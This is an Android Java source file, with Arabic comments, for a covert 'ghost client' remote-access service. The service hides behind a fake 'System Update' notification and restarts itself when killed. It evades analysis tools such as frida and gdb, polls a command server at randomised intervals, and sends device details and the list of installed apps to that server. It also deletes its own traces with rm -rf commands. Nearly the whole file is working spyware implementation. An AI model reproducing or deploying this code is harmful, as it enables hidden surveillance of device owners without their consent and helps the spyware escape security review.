package com.remoteguardian.client;

import android.app.Service;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.content.Context;
import android.os.Build;
import android.os.IBinder;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.net.Uri;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.crypto.spec.IvParameterSpec;

import org.json.JSONObject;
import org.json.JSONArray;

/**
 * Remote Guardian - Ghost Client Service v3.0
 * خدمة Android للعميل الشبح
 * 
 * الميزات:
 * - تعمل في الخلفية دون ظهور أيقونة
 * - تشفير كامل للبيانات
 * - كشف محاولات الكشف
 * - تنظيف ذاتي للآثار
 */
public class GhostClientService extends Service {
    
    private static final String TAG = "GhostClient";
    private static final String CHANNEL_ID = "ghost_channel";
    private static final int NOTIFICATION_ID = 1;
    
    // الإعدادات الأمنية
    private String SERVER_URL = "__SERVER_URL__";
    private String CLIENT_ID = "__CLIENT_ID__";
    private String MASTER_KEY = "__MASTER_KEY__";
    private String SESSION_KEY = "";
    
    // متغيرات الحالة
    private Handler handler;
    private Timer pollTimer;
    private boolean isDetected = false;
    private long lastPollTime = 0;
    private long pollInterval = 30000 + new Random().nextInt(20000); // 30-50 ثانية عشوائية
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Ghost Client Service Created");
        
        handler = new Handler(Looper.getMainLooper());
        
        // إنشاء قناة الإخطارات
        createNotificationChannel();
        
        // بدء الخدمة كـ Foreground Service
        startForegroundService();
        
        // بدء حلقة الاستقصاء
        startPolling();
        
        // كشف الكشف
        detectDetection();
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Ghost Client Service Started");
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Ghost Client Service Destroyed");
        
        if (pollTimer != null) {
            pollTimer.cancel();
        }
        
        // إعادة تشغيل الخدمة
        Intent restartIntent = new Intent(getApplicationContext(), GhostClientService.class);
        startService(restartIntent);
    }
    
    // ============ إنشاء الخدمة الأمامية ============
    
    /**
     * إنشاء قناة الإخطارات
     */
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Ghost Client",
                NotificationManager.IMPORTANCE_NONE
            );
            
            channel.setShowBadge(false);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    /**
     * بدء الخدمة الأمامية
     */
    private void startForegroundService() {
        Intent notificationIntent = new Intent(this, MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(
            this, 0, notificationIntent, PendingIntent.FLAG_IMMUTABLE
        );
        
        Notification notification = new Notification.Builder(this, CHANNEL_ID)
            .setContentIntent(pendingIntent)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("System Update")
            .setContentText("Updating system...")
            .setOngoing(true)
            .build();
        
        startForeground(NOTIFICATION_ID, notification);
    }
    
    // ============ نظام التشفير ============
    
    /**
     * تشفير البيانات
     */
    private String encryptData(String data) {
        try {
            byte[] key = SESSION_KEY.getBytes(StandardCharsets.UTF_8);
            byte[] iv = new byte[16];
            new Random().nextBytes(iv);
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(key, 0, key.length, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            
            cipher.init(Cipher.ENCRYPT_MODE, keySpec, ivSpec);
            byte[] encrypted = cipher.doFinal(data.getBytes(StandardCharsets.UTF_8));
            
            // دمج IV مع البيانات المشفرة
            byte[] result = new byte[iv.length + encrypted.length];
            System.arraycopy(iv, 0, result, 0, iv.length);
            System.arraycopy(encrypted, 0, result, iv.length, encrypted.length);
            
            return bytesToHex(result);
        } catch (Exception e) {
            Log.e(TAG, "Encryption error: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * فك تشفير البيانات
     */
    private String decryptData(String encryptedData) {
        try {
            byte[] key = SESSION_KEY.getBytes(StandardCharsets.UTF_8);
            byte[] data = hexToBytes(encryptedData);
            
            byte[] iv = new byte[16];
            System.arraycopy(data, 0, iv, 0, 16);
            
            byte[] encrypted = new byte[data.length - 16];
            System.arraycopy(data, 16, encrypted, 0, encrypted.length);
            
            Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
            SecretKeySpec keySpec = new SecretKeySpec(key, 0, key.length, "AES");
            IvParameterSpec ivSpec = new IvParameterSpec(iv);
            
            cipher.init(Cipher.DECRYPT_MODE, keySpec, ivSpec);
            byte[] decrypted = cipher.doFinal(encrypted);
            
            return new String(decrypted, StandardCharsets.UTF_8);
        } catch (Exception e) {
            Log.e(TAG, "Decryption error: " + e.getMessage());
            return null;
        }
    }
    
    /**
     * تحويل البايتات إلى Hex
     */
    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02x", b));
        }
        return sb.toString();
    }
    
    /**
     * تحويل Hex إلى البايتات
     */
    private byte[] hexToBytes(String hex) {
        int len = hex.length();
        byte[] data = new byte[len / 2];
        for (int i = 0; i < len; i += 2) {
            data[i / 2] = (byte) ((Character.digit(hex.charAt(i), 16) << 4)
                                 + Character.digit(hex.charAt(i+1), 16));
        }
        return data;
    }
    
    // ============ كشف الكشف ============
    
    /**
     * كشف محاولات الكشف
     */
    private void detectDetection() {
        new Thread(() -> {
            try {
                // كشف أدوات التصحيح
                String[] debugTools = {"strace", "ltrace", "gdb", "frida", "xposed"};
                
                for (String tool : debugTools) {
                    if (isProcessRunning(tool)) {
                        isDetected = true;
                        Log.w(TAG, "Detection tool found: " + tool);
                        activateAntiDebug();
                    }
                }
                
                // كشف التطبيقات المريبة
                PackageManager pm = getPackageManager();
                List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
                
                String[] suspiciousApps = {"com.android.vending.billing.InAppBillingService.LOCK",
                                          "com.frida", "com.xposed"};
                
                for (ApplicationInfo app : packages) {
                    for (String suspiciousApp : suspiciousApps) {
                        if (app.packageName.contains(suspiciousApp)) {
                            isDetected = true;
                            Log.w(TAG, "Suspicious app detected: " + app.packageName);
                        }
                    }
                }
            } catch (Exception e) {
                Log.e(TAG, "Detection error: " + e.getMessage());
            }
        }).start();
    }
    
    /**
     * التحقق من وجود عملية
     */
    private boolean isProcessRunning(String processName) {
        try {
            Process process = Runtime.getRuntime().exec("ps");
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            
            while ((line = reader.readLine()) != null) {
                if (line.contains(processName)) {
                    return true;
                }
            }
            
            reader.close();
            return false;
        } catch (Exception e) {
            return false;
        }
    }
    
    /**
     * تفعيل الحماية من التصحيح
     */
    private void activateAntiDebug() {
        Log.w(TAG, "Anti-debug activated");
        
        // محاولة إيقاف العملية الحالية
        if (isDetected) {
            cleanupTraces();
            stopSelf();
        }
    }
    
    // ============ جمع المعلومات ============
    
    /**
     * جمع معلومات النظام
     */
    private JSONObject getSystemInfo() {
        try {
            JSONObject info = new JSONObject();
            
            info.put("device", android.os.Build.DEVICE);
            info.put("model", android.os.Build.MODEL);
            info.put("manufacturer", android.os.Build.MANUFACTURER);
            info.put("androidVersion", android.os.Build.VERSION.RELEASE);
            info.put("sdkVersion", android.os.Build.VERSION.SDK_INT);
            info.put("timestamp", System.currentTimeMillis());
            
            return info;
        } catch (Exception e) {
            Log.e(TAG, "Error getting system info: " + e.getMessage());
            return new JSONObject();
        }
    }
    
    /**
     * جمع معلومات التطبيقات المثبتة
     */
    private JSONArray getInstalledApps() {
        JSONArray apps = new JSONArray();
        
        try {
            PackageManager pm = getPackageManager();
            List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            
            for (ApplicationInfo app : packages) {
                JSONObject appInfo = new JSONObject();
                appInfo.put("name", app.loadLabel(pm).toString());
                appInfo.put("package", app.packageName);
                appInfo.put("version", pm.getPackageInfo(app.packageName, 0).versionName);
                apps.put(appInfo);
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting installed apps: " + e.getMessage());
        }
        
        return apps;
    }
    
    // ============ حلقة الاستقصاء ============
    
    /**
     * بدء حلقة الاستقصاء
     */
    private void startPolling() {
        pollTimer = new Timer();
        pollTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                pollServer();
            }
        }, 0, pollInterval);
    }
    
    /**
     * الاستقصاء من الخادم
     */
    private void pollServer() {
        new Thread(() -> {
            try {
                String url = SERVER_URL + "/command?clientId=" + CLIENT_ID;
                HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
                connection.setRequestMethod("GET");
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);
                connection.setRequestProperty("User-Agent", "Mozilla/5.0");
                connection.setRequestProperty("X-Client-ID", CLIENT_ID);
                
                int responseCode = connection.getResponseCode();
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    BufferedReader reader = new BufferedReader(
                        new InputStreamReader(connection.getInputStream())
                    );
                    
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) {
                        response.append(line);
                    }
                    
                    reader.close();
                    
                    String command = response.toString().trim();
                    if (!command.isEmpty() && !command.equals("idle")) {
                        executeCommand(command);
                    }
                }
                
                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Poll error: " + e.getMessage());
            }
        }).start();
    }
    
    /**
     * تنفيذ الأمر
     */
    private void executeCommand(String command) {
        Log.d(TAG, "Executing command: " + command);
        
        try {
            if (command.equals("sysinfo")) {
                JSONObject info = getSystemInfo();
                sendCommandResult("sysinfo", info.toString());
            }
            else if (command.equals("apps")) {
                JSONArray apps = getInstalledApps();
                sendCommandResult("apps", apps.toString());
            }
            else if (command.equals("cleanup")) {
                cleanupTraces();
                sendCommandResult("cleanup", "{\"status\":\"cleaned\"}");
            }
            else if (command.equals("selfdestruct")) {
                Log.w(TAG, "Self-destruct command received");
                cleanupTraces();
                stopSelf();
            }
        } catch (Exception e) {
            Log.e(TAG, "Command execution error: " + e.getMessage());
        }
    }
    
    /**
     * إرسال نتيجة الأمر
     */
    private void sendCommandResult(String commandId, String result) {
        new Thread(() -> {
            try {
                String url = SERVER_URL + "/command-result";
                HttpURLConnection connection = (HttpURLConnection) new URL(url).openConnection();
                connection.setRequestMethod("POST");
                connection.setRequestProperty("Content-Type", "application/json");
                connection.setConnectTimeout(10000);
                connection.setReadTimeout(10000);
                
                JSONObject payload = new JSONObject();
                payload.put("clientId", CLIENT_ID);
                payload.put("commandId", commandId);
                payload.put("result", result);
                payload.put("timestamp", System.currentTimeMillis());
                
                OutputStream os = connection.getOutputStream();
                os.write(payload.toString().getBytes(StandardCharsets.UTF_8));
                os.close();
                
                connection.getResponseCode();
                connection.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Send result error: " + e.getMessage());
            }
        }).start();
    }
    
    /**
     * تنظيف الآثار
     */
    private void cleanupTraces() {
        Log.d(TAG, "Cleaning traces");
        
        try {
            // حذف السجلات
            Runtime.getRuntime().exec("rm -rf /sdcard/.ghost/temp/*");
            Runtime.getRuntime().exec("rm -rf /sdcard/.ghost/cache/*");
        } catch (Exception e) {
            Log.e(TAG, "Cleanup error: " + e.getMessage());
        }
    }
}
